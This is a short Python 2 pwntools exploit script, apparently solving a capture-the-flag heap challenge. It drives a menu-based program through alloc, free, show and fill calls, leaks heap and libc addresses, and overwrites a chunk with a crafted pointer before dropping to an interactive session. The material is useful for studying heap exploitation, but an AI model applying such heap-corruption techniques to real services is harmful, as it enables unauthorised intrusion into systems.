from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
 
def alloc(size):
  s.recvuntil('>>')
  s.sendline('1')
  s.recvuntil('Size:')
  s.sendline(str(size))

def free(index):
  s.recvuntil('>>')
  s.sendline('2')
  s.recvuntil(':')
  s.sendline(str(index))

def show():
  s.recvuntil('>>')
  s.sendline('4')

def fill(dat):
  s.recvuntil('>>')
  s.sendline('3')
  s.recvuntil('Content:')
  s.send(dat)

alloc(0x100)
alloc(0x100)
alloc(0x100)
alloc(0x100)
free(0)
free(2)
free(3)
alloc(0x400)
show()
heap = u64(s.recvuntil('\n')[-7:-1]+"\x00\x00")
print "HEAP : ",hex(heap)
alloc(0x100)
free(2)
free(1)
alloc(0x108)
show()
libc = u64(s.recvuntil('\n')[-7:-1]+"\x00\x00")
print "LIBC : ",hex(libc)
alloc(0x1000)
free(2)

alloc(0xf8)
alloc(0xf8)
alloc(0x88)
alloc(0xf8)
free(0x4)
alloc(0x88)
fill("A"*0x80+p64(heap))
s.interactive()
